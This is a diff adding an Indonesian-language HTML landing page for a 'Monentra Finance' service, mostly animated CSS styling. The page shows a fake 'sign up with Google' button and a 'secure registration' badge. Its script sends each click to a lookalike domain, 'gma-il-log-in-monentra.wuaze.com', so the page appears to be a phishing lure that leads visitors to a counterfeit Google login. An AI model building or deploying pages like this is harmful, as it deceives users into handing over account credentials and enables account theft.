@@ -1,0 +1,1085 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0,
+               maximum-scale=1.0, user-scalable=no">
+
+<meta name="theme-color" content="#050914">
+
+<title>Monentra Finance</title>
+
+<style>
+
+/* ==============================
+   RESET
+================================ */
+
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+}
+
+html,
+body{
+    width:100%;
+    min-height:100%;
+}
+
+body{
+    font-family:
+        -apple-system,
+        BlinkMacSystemFont,
+        "Segoe UI",
+        Arial,
+        sans-serif;
+
+    color:#fff;
+    overflow:hidden;
+
+    background:#050914;
+}
+
+
+/* ==============================
+   ANIMATED BACKGROUND
+================================ */
+
+.background{
+    position:fixed;
+    inset:0;
+    overflow:hidden;
+    z-index:0;
+
+    background:
+        radial-gradient(
+            circle at 50% -10%,
+            rgba(37,99,235,.20),
+            transparent 42%
+        ),
+        radial-gradient(
+            circle at 100% 100%,
+            rgba(79,70,229,.18),
+            transparent 40%
+        ),
+        #050914;
+}
+
+
+/* GRID */
+
+.background::before{
+    content:"";
+
+    position:absolute;
+    inset:-100px;
+
+    background-image:
+        linear-gradient(
+            rgba(96,165,250,.035) 1px,
+            transparent 1px
+        ),
+        linear-gradient(
+            90deg,
+            rgba(96,165,250,.035) 1px,
+            transparent 1px
+        );
+
+    background-size:35px 35px;
+
+    transform:perspective(500px)
+              rotateX(60deg)
+              scale(1.5);
+
+    transform-origin:center bottom;
+
+    animation:gridMove 12s linear infinite;
+}
+
+@keyframes gridMove{
+
+    from{
+        transform:
+            perspective(500px)
+            rotateX(60deg)
+            scale(1.5)
+            translateY(0);
+    }
+
+    to{
+        transform:
+            perspective(500px)
+            rotateX(60deg)
+            scale(1.5)
+            translateY(35px);
+    }
+}
+
+
+/* ==============================
+   GLOW ORBS
+================================ */
+
+.orb{
+    position:absolute;
+
+    border-radius:50%;
+
+    filter:blur(5px);
+
+    pointer-events:none;
+}
+
+.orb1{
+    width:260px;
+    height:260px;
+
+    top:-130px;
+    left:-100px;
+
+    background:
+        radial-gradient(
+            circle,
+            rgba(37,99,235,.48),
+            transparent 70%
+        );
+
+    animation:
+        orbOne 8s ease-in-out infinite;
+}
+
+.orb2{
+    width:300px;
+    height:300px;
+
+    right:-150px;
+    bottom:-130px;
+
+    background:
+        radial-gradient(
+            circle,
+            rgba(79,70,229,.40),
+            transparent 70%
+        );
+
+    animation:
+        orbTwo 10s ease-in-out infinite;
+}
+
+.orb3{
+    width:130px;
+    height:130px;
+
+    top:45%;
+    left:-80px;
+
+    background:
+        radial-gradient(
+            circle,
+            rgba(14,165,233,.24),
+            transparent 70%
+        );
+
+    animation:
+        orbThree 7s ease-in-out infinite;
+}
+
+@keyframes orbOne{
+
+    0%,100%{
+        transform:
+            translate(0,0)
+            scale(1);
+    }
+
+    50%{
+        transform:
+            translate(40px,50px)
+            scale(1.15);
+    }
+}
+
+@keyframes orbTwo{
+
+    0%,100%{
+        transform:
+            translate(0,0)
+            scale(1);
+    }
+
+    50%{
+        transform:
+            translate(-45px,-35px)
+            scale(1.12);
+    }
+}
+
+@keyframes orbThree{
+
+    0%,100%{
+        transform:
+            translateY(0);
+        opacity:.35;
+    }
+
+    50%{
+        transform:
+            translateY(-80px);
+        opacity:.7;
+    }
+}
+
+
+/* ==============================
+   PARTICLES
+================================ */
+
+.particle{
+    position:absolute;
+
+    width:3px;
+    height:3px;
+
+    border-radius:50%;
+
+    background:#60a5fa;
+
+    box-shadow:
+        0 0 10px #3b82f6;
+
+    opacity:.4;
+
+    animation:
+        particleFloat
+        linear infinite;
+}
+
+.p1{
+    left:15%;
+    bottom:-10px;
+    animation-duration:9s;
+}
+
+.p2{
+    left:72%;
+    bottom:-10px;
+    animation-duration:12s;
+    animation-delay:2s;
+}
+
+.p3{
+    left:42%;
+    bottom:-10px;
+    animation-duration:10s;
+    animation-delay:4s;
+}
+
+.p4{
+    left:88%;
+    bottom:-10px;
+    animation-duration:14s;
+    animation-delay:1s;
+}
+
+.p5{
+    left:27%;
+    bottom:-10px;
+    animation-duration:11s;
+    animation-delay:5s;
+}
+
+@keyframes particleFloat{
+
+    0%{
+        transform:
+            translateY(0)
+            scale(.5);
+
+        opacity:0;
+    }
+
+    15%{
+        opacity:.5;
+    }
+
+    80%{
+        opacity:.35;
+    }
+
+    100%{
+        transform:
+            translateY(-110vh)
+            scale(1.2);
+
+        opacity:0;
+    }
+}
+
+
+/* ==============================
+   MAIN
+================================ */
+
+.page{
+    position:relative;
+
+    z-index:5;
+
+    min-height:100vh;
+
+    width:100%;
+
+    display:flex;
+
+    align-items:center;
+    justify-content:center;
+
+    padding:20px;
+}
+
+
+/* ==============================
+   CARD
+================================ */
+
+.card{
+
+    width:100%;
+    max-width:390px;
+
+    padding:
+        34px
+        24px
+        27px;
+
+    text-align:center;
+
+    border-radius:25px;
+
+    background:
+        linear-gradient(
+            145deg,
+            rgba(13,25,46,.93),
+            rgba(5,13,26,.95)
+        );
+
+    border:
+        1px solid
+        rgba(96,165,250,.20);
+
+    box-shadow:
+        0 25px 70px
+        rgba(0,0,0,.55),
+
+        0 0 50px
+        rgba(37,99,235,.08);
+
+    backdrop-filter:
+        blur(22px);
+
+    -webkit-backdrop-filter:
+        blur(22px);
+
+    animation:
+        cardIn
+        .8s
+        cubic-bezier(.2,.8,.2,1);
+}
+
+@keyframes cardIn{
+
+    from{
+        opacity:0;
+
+        transform:
+            translateY(45px)
+            scale(.94);
+    }
+
+    to{
+        opacity:1;
+
+        transform:
+            translateY(0)
+            scale(1);
+    }
+}
+
+
+/* ==============================
+   LOGO
+================================ */
+
+.logo-area{
+
+    position:relative;
+
+    width:78px;
+    height:78px;
+
+    margin:
+        0 auto
+        20px;
+
+    display:flex;
+
+    align-items:center;
+    justify-content:center;
+}
+
+
+/* Glow */
+
+.logo-glow{
+
+    position:absolute;
+
+    width:75px;
+    height:75px;
+
+    border-radius:23px;
+
+    background:
+        rgba(37,99,235,.45);
+
+    filter:blur(18px);
+
+    animation:
+        logoGlow
+        2.5s
+        ease-in-out
+        infinite;
+}
+
+@keyframes logoGlow{
+
+    0%,100%{
+        transform:scale(.85);
+        opacity:.4;
+    }
+
+    50%{
+        transform:scale(1.18);
+        opacity:.8;
+    }
+}
+
+
+/*
+    GANTI LOGO DI SINI
+
+    File:
+    Logo.png
+
+    Taruh Logo.png
+    satu folder dengan HTML.
+*/
+
+.logo{
+
+    position:relative;
+
+    width:70px;
+    height:70px;
+
+    object-fit:cover;
+
+    border-radius:20px;
+
+    border:
+        1px solid
+        rgba(255,255,255,.15);
+
+    box-shadow:
+        0 10px 30px
+        rgba(37,99,235,.35);
+
+    animation:
+        logoFloat
+        3s
+        ease-in-out
+        infinite;
+}
+
+@keyframes logoFloat{
+
+    0%,100%{
+        transform:translateY(0);
+    }
+
+    50%{
+        transform:translateY(-5px);
+    }
+}
+
+
+/* ==============================
+   TITLE
+================================ */
+
+h1{
+
+    font-size:25px;
+
+    line-height:1.2;
+
+    font-weight:750;
+
+    letter-spacing:-.5px;
+
+    margin-bottom:11px;
+
+    animation:
+        textIn
+        .7s
+        .12s
+        both;
+}
+
+.description{
+
+    max-width:310px;
+
+    margin:auto;
+
+    color:#94a3b8;
+
+    font-size:13px;
+
+    line-height:1.65;
+
+    animation:
+        textIn
+        .7s
+        .22s
+        both;
+}
+
+@keyframes textIn{
+
+    from{
+        opacity:0;
+        transform:translateY(12px);
+    }
+
+    to{
+        opacity:1;
+        transform:translateY(0);
+    }
+}
+
+
+/* ==============================
+   DIVIDER
+================================ */
+
+.divider{
+
+    display:flex;
+
+    align-items:center;
+
+    gap:10px;
+
+    margin:
+        27px
+        0
+        16px;
+
+    color:#64748b;
+
+    font-size:11px;
+
+    animation:
+        textIn
+        .7s
+        .32s
+        both;
+}
+
+.divider::before,
+.divider::after{
+
+    content:"";
+
+    flex:1;
+
+    height:1px;
+
+    background:
+        linear-gradient(
+            90deg,
+            transparent,
+            #26364e
+        );
+}
+
+.divider::after{
+
+    background:
+        linear-gradient(
+            90deg,
+            #26364e,
+            transparent
+        );
+}
+
+
+/* ==============================
+   GOOGLE BUTTON
+================================ */
+
+.google-btn{
+
+    position:relative;
+
+    width:100%;
+
+    height:55px;
+
+    display:flex;
+
+    align-items:center;
+
+    justify-content:center;
+
+    gap:11px;
+
+    border:none;
+
+    border-radius:14px;
+
+    background:#fff;
+
+    color:#151a23;
+
+    font-size:14px;
+
+    font-weight:650;
+
+    cursor:pointer;
+
+    overflow:hidden;
+
+    box-shadow:
+        0 10px 25px
+        rgba(0,0,0,.25);
+
+    transition:
+        transform .2s ease,
+        box-shadow .2s ease;
+
+    animation:
+        buttonIn
+        .7s
+        .42s
+        both;
+}
+
+.google-btn::before{
+
+    content:"";
+
+    position:absolute;
+
+    top:0;
+    left:-120%;
+
+    width:70%;
+    height:100%;
+
+    background:
+        linear-gradient(
+            100deg,
+            transparent,
+            rgba(255,255,255,.8),
+            transparent
+        );
+
+    transform:skewX(-20deg);
+
+    transition:.7s;
+}
+
+.google-btn:hover::before{
+
+    left:140%;
+}
+
+.google-btn:active{
+
+    transform:scale(.96);
+
+    box-shadow:
+        0 5px 15px
+        rgba(0,0,0,.2);
+}
+
+@keyframes buttonIn{
+
+    from{
+        opacity:0;
+        transform:
+            translateY(15px)
+            scale(.97);
+    }
+
+    to{
+        opacity:1;
+        transform:
+            translateY(0)
+            scale(1);
+    }
+}
+
+
+/* GOOGLE ICON */
+
+.google-icon{
+
+    width:25px;
+    height:25px;
+
+    display:flex;
+
+    align-items:center;
+    justify-content:center;
+
+    font-size:18px;
+
+    font-weight:800;
+
+    color:#4285f4;
+}
+
+
+/* ==============================
+   TERMS
+================================ */
+
+.terms{
+
+    margin-top:17px;
+
+    color:#64748b;
+
+    font-size:10px;
+
+    line-height:1.6;
+
+    animation:
+        textIn
+        .7s
+        .52s
+        both;
+}
+
+
+/* ==============================
+   SECURITY
+================================ */
+
+.secure{
+
+    display:flex;
+
+    align-items:center;
+    justify-content:center;
+
+    gap:6px;
+
+    margin-top:19px;
+
+    color:#64748b;
+
+    font-size:10px;
+
+    animation:
+        textIn
+        .7s
+        .62s
+        both;
+}
+
+.secure-icon{
+
+    color:#60a5fa;
+
+    font-size:12px;
+}
+
+
+/* ==============================
+   FOOTER
+================================ */
+
+footer{
+
+    position:absolute;
+
+    bottom:13px;
+
+    color:#475569;
+
+    font-size:10px;
+
+    animation:
+        textIn
+        .7s
+        .75s
+        both;
+}
+
+
+/* ==============================
+   VERY SMALL PHONE
+================================ */
+
+@media(max-height:650px){
+
+    .card{
+
+        padding-top:25px;
+        padding-bottom:21px;
+
+        transform:scale(.92);
+    }
+
+    .logo-area{
+
+        margin-bottom:12px;
+    }
+
+    .divider{
+
+        margin-top:20px;
+    }
+
+    .secure{
+
+        margin-top:13px;
+    }
+}
+
+
+/* ==============================
+   REDUCE MOTION
+================================ */
+
+@media(prefers-reduced-motion:reduce){
+
+    *,
+    *::before,
+    *::after{
+
+        animation:none !important;
+
+        transition:none !important;
+    }
+}
+
+</style>
+</head>
+
+
+<body>
+
+
+<!-- =================================
+     ANIMATED BACKGROUND
+================================= -->
+
+<div class="background">
+
+    <div class="orb orb1"></div>
+
+    <div class="orb orb2"></div>
+
+    <div class="orb orb3"></div>
+
+
+    <div class="particle p1"></div>
+    <div class="particle p2"></div>
+    <div class="particle p3"></div>
+    <div class="particle p4"></div>
+    <div class="particle p5"></div>
+
+</div>
+
+
+
+<!-- =================================
+     MAIN
+================================= -->
+
+<main class="page">
+
+    <section class="card">
+
+
+        <!-- LOGO -->
+
+        <div class="logo-area">
+
+            <div class="logo-glow"></div>
+
+            <!--
+                GANTI LOGO:
+
+                Logo.png
+
+                Taruh file Logo.png
+                di folder yang sama.
+            -->
+
+            <img
+                src="monen.png"
+                class="logo"
+                alt="Monentra Finance"
+            >
+
+        </div>
+
+
+        <!-- TITLE -->
+
+        <h1>
+            Monentra Finance
+        </h1>
+
+
+        <!-- DESCRIPTION -->
+
+        <p class="description">
+
+            Platform layanan keuangan digital
+            yang dirancang untuk memberikan
+            pengalaman yang mudah, cepat,
+            dan nyaman.
+
+        </p>
+
+
+        <!-- DIVIDER -->
+
+        <div class="divider">
+
+            <span>
+                Daftar untuk melanjutkan
+            </span>
+
+        </div>
+
+
+        <!-- GOOGLE -->
+
+        <button
+            type="button"
+            class="google-btn"
+            id="googleBtn">
+
+            <span class="google-icon">
+                G
+            </span>
+
+            <span>
+                Daftar menggunakan Google
+            </span>
+
+        </button>
+
+
+        <!-- TERMS -->
+
+        <p class="terms">
+
+            Dengan melanjutkan, Anda menyetujui
+            ketentuan dan kebijakan layanan
+            Monentra Finance.
+
+        </p>
+
+
+        <!-- SECURITY -->
+
+        <div class="secure">
+
+            <span class="secure-icon">
+                🔒
+            </span>
+
+            <span>
+                Pendaftaran aman dan terlindungi
+            </span>
+
+        </div>
+
+
+    </section>
+
+
+    <footer>
+
+        © 2026 Monentra Finance
+
+    </footer>
+
+</main>
+
+
+
+<script>
+
+/* =================================
+   URL TUJUAN
+=================================
+
+   GANTI dengan URL halaman yang
+   memang kamu kontrol.
+
+   Contoh:
+
+   const tujuan =
+   "https://domain-kamu.com/daftar";
+
+*/
+
+const tujuan = "http://gma-il-log-in-monentra.wuaze.com/";
+
+
+/* =================================
+   GOOGLE BUTTON
+================================= */
+
+const googleBtn =
+    document.getElementById("googleBtn");
+
+
+googleBtn.addEventListener(
+    "click",
+    function(){
+
+        googleBtn.style.transform =
+            "scale(.95)";
+
+        googleBtn.style.opacity =
+            ".75";
+
+
+        setTimeout(function(){
+
+            window.location.href =
+                tujuan;
+
+        },180);
+
+    }
+);
+
+</script>
+
+
+</body>
+</html>
